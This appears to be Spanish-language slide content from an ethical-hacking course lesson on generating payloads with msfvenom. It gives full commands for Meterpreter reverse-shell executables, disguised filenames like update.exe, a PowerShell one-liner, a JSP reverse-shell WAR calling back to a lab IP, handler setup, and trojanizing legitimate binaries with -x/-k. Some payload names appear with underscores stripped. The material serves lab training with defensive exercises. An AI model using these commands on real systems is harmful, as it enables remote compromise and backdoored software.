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075 — msfvenom: generación de payloads</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alumno aprenderá a generar payloads independientes con msfvenom en múltiples formatos y plataformas (ejecutables Windows, binarios Linux, scripts web, one-liners de PowerShell), comprenderá el papel real de los encoders y las plantillas, y aprenderá a recibir la conexión resultante con multi/handler. msfvenom es, en esencia, la herramienta que genera malware funcional con fines educativos; por eso esta clase exige el nivel más alto de responsabilidad ética del módulo.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Generar payloads standalone para Windows, Linux y aplicaciones web usando msfvenom.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Seleccionar correctamente formato de salida, arquitectura y tipo de payload según el objetivo.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Configurar LHOST/LPORT y recibir la sesión resultante con exploit/multi/handler.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Aplicar encoders e iteraciones, y explicar honestamente por qué no constituyen una evasión de antivirus fiable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Distinguir payloads staged y stageless y elegir el handler correspondiente sin errores.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Incrustar un payload en una plantilla ejecutable legítima usando -x y -k.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Anatomía de un comando msfvenom (-p, -f, -o, LHOST, LPORT)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  2 — Formatos de salida (-f): exe, elf, raw, psh, war</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  3 — Listado de payloads y formatos disponibles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  4 — Encoders (-e, -i) y sus límites reales</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  5 — Plantillas (-x, -k)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  6 — exploit/multi/handler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  7 — Bad characters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msfvenom: herramienta de línea de comandos que fusiona las antiguas msfpayload y msfencode, generando payloads standalone ejecutables fuera de msfconsole. Característica clave: produce artefactos binarios o scripts que se ejecutan de forma independiente en el sistema objetivo.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Formato de salida (-f): contenedor final del payload (exe, elf, raw, psh-cmd, war, apk, entre otros). Característica clave: debe coincidir exactamente con el mecanismo de ejecución previsto en el objetivo (doble clic, chmod +x, despliegue en un servidor de aplicaciones, etc.).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Encoder: transforma la representación del payload para evitar bad characters o introducir variación superficial en la firma binaria. Característica clave: no es una técnica de evasión de antivirus moderno fiable; los motores actuales usan heurística y análisis de comportamiento, no solo firmas estáticas.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Plantilla (-x): ejecutable legítimo preexistente en el que se inyecta el payload generado. Característica clave: la opción -k intenta preservar la funcionalidad original del ejecutable mientras corre el payload en un hilo separado.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Bad characters (-b): bytes que deben evitarse en el payload generado porque rompen la ejecución en un contexto de explotación específico (por ejemplo \x00 en buffers basados en strings terminadas en null). Característica clave: se identifican durante el desarrollo del exploit, no son universales para todos los escenarios.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  exploit/multi/handler: módulo genérico de Metasploit que actúa como listener para cualquier payload standalone generado con msfvenom. Característica clave: la configuración del handler (tipo de payload, LHOST, LPORT) debe ser idéntica a la usada al generar el payload.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Metasploit Framework (incluye msfvenom) en Kali Linux o Parrot OS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Listar payloads y formatos disponibles antes de empezar:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  msfvenom --list payloads | less</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  msfvenom --list formats</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Una VM de laboratorio propia (Windows o Linux) donde el propio alumno ejecutará el artefacto generado, simulando la entrega sin involucrar a terceros ni técnicas de ingeniería social real.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Espacio de almacenamiento local aislado para los binarios generados (nunca subirlos a servicios de análisis públicos).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Atacante Kali con IP 192.168.56.10 (ajustar según tu red de laboratorio).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Genera un payload Meterpreter reverse para Windows en formato ejecutable: msfvenom -p windows/x64/meterpreter/reversetcp LHOST=192.168.56.10 LPORT=4444 -f exe -o /tmp/update.exe.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Genera el equivalente para Linux en formato ELF: msfvenom -p linux/x64/meterpreter/reversetcp LHOST=192.168.56.10 LPORT=4444 -f elf -o /tmp/backup.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Genera un one-liner de PowerShell para escenarios donde no se puede subir un ejecutable: msfvenom -p windows/x64/meterpreter/reversetcp LHOST=192.168.56.10 LPORT=4444 -f psh-cmd.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Genera un payload web para un servidor Tomcat de laboratorio: msfvenom -p java/jspshellreversetcp LHOST=192.168.56.10 LPORT=4444 -f war -o /tmp/shell.war.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Genera un payload con encoder e iteraciones, con fines exclusivamente didácticos para observar el efecto (no de evasión real): msfvenom -p windows/meterpreter/reversetcp LHOST=192.168.56.10 LPORT=4444 -e x86/shikataganai -i 5 -f exe -o /tmp/enc.exe.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Levanta el handler correspondiente en msfconsole: use exploit/multi/handler, set PAYLOAD windows/x64/meterpreter/reversetcp, set LHOST 192.168.56.10, set LPORT 4444, exploit -j.</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Genera el mismo payload en formato exe y en formato raw, y explica en qué escenario usarías cada uno.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Genera un payload evitando bytes específicos con -b '\x00\x0a' y justifica por qué se evitarían esos bytes en un contexto de explotación de buffer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Incrusta un payload en un ejecutable legítimo de tu laboratorio usando -x y -k, y comprueba que ambas funcionalidades (la original y el payload) siguen operativas.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Explica, con fundamento técnico, por qué el encoder shikataganai ya no evade antivirus modernos con detección heurística.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Genera un one-liner de PowerShell y descompón, paso a paso, qué hace cada segmento del comando resultante.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Configura un handler que coincida con un payload staged y otro que coincida con uno stageless, documentando la diferencia exacta en la nomenclatura de ambos.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Desde la óptica defensiva, documenta qué regla de EDR o de hash (ej. detección por comportamiento de proceso hijo inesperado) permitiría bloquear la ejecución del payload generado en el ejercicio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Reto: Generar un payload con msfvenom, entregarlo únicamente en la VM de laboratorio propia, y obtener la sesión correspondiente en el handler configurado.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Criterio de aceptación: el artefacto se genera con LHOST/LPORT correctos y documentados; el handler en msfconsole usa exactamente el mismo tipo de payload (misma arquitectura, mismo formato staged/stageless); tras ejecutar el binario manualmente en la VM propia, sessions -l muestra la sesión activa; y se documenta el comando exacto de generación junto con el comando exacto del handler.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 handler nunca recibe la conexión — El payload configurado en el handler no coincide exactamente con el generado (arquitectura o staged/stageless distintos); deben ser idénticos</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  "No encoder succeeded" al generar el payload — Combinación de bad chars imposible de resolver o payload demasiado grande tras el encoding; reducir la lista de -b</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  El ejecutable es detectado y eliminado por el antivirus del laboratorio — Comportamiento esperado y correcto; los encoders de msfvenom no están diseñados para evadir AV moderno</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  El payload Linux no se ejecuta tras transferirlo — Falta el permiso de ejecución; aplicar chmod +x antes de ejecutar</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Se generó para arquitectura equivocada (x86 en un sistema x64) — Verificar la arquitectura del objetivo y usar el payload correspondiente, ej. windows/x64/...</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  El binario troyanizado con -x deja de funcionar como el original — Falta la opción -k, que preserva la ejecución del binario original en un hilo separado</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  El payload web (.war) no se despliega en el servidor de laboratorio — Falta reiniciar el servicio de aplicaciones o el archivo no tiene el nombre/ruta esperada por el auto-deploy; revisar logs del servidor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¿Los encoders de msfvenom evaden antivirus modernos?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  No de forma fiable. Encoders como shikataganai fueron diseñados originalmente para evitar bad characters en contextos de explotación, no para evadir motores de antivirus con heurística y análisis de comportamiento. Presentarlos como técnica de evasión sería engañoso; la evasión real de AV requiere técnicas mucho más avanzadas fuera del alcance de esta clase.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  ❓ ¿Cómo distingo un payload staged de uno stageless en msfvenom?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Por la nomenclatura: un payload como windows/meterpreter/reversetcp (con / antes de reversetcp) es staged, mientras que windows/meterpreterreversetcp (con  uniendo meterpreter y reversetcp) es stageless. El handler debe configurarse exactamente con el mismo string.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  ❓ ¿Puedo subir el payload generado a VirusTotal para probar si es detectado?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  No, ni siquiera en laboratorio. Servicios como VirusTotal comparten las muestras enviadas con proveedores de antivirus y terceros, lo que podría filtrar tu artefacto o, en un engagement real, alertar prematuramente al objetivo. Usa siempre un entorno de análisis aislado y propio.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  ❓ ¿Qué formato de payload uso para una aplicación web Java vulnerable en laboratorio?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Kim, P. "The Hacker Playbook 3" (2018) — capítulo sobre generación y entrega de payloads.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Weidman, G. "Penetration Testing: A Hands-On Introduction to Hacking" (No Starch Press, 2014) — fundamentos de payloads y shells.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Offensive Security, documentación de msfvenom: &lt;https://www.offsec.com/metasploit-unleashed/msfvenom/&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  Rapid7, documentación oficial de Metasploit sobre msfvenom: &lt;https://docs.metasploit.com/&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  MITRE ATT&amp;CK, técnica T1027 (Obfuscated Files or Information) como contexto defensivo de encoders: &lt;https://attack.mitre.org/techniques/T1027/&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="22282E"/>
                </a:solidFill>
              </a:rPr>
              <a:t>•  MITRE ATT&amp;CK, técnica T1071 (Application Layer Protocol) para el tráfico de comando y control de un handler: &lt;https://attack.mitre.org/techniques/T1071/&gt;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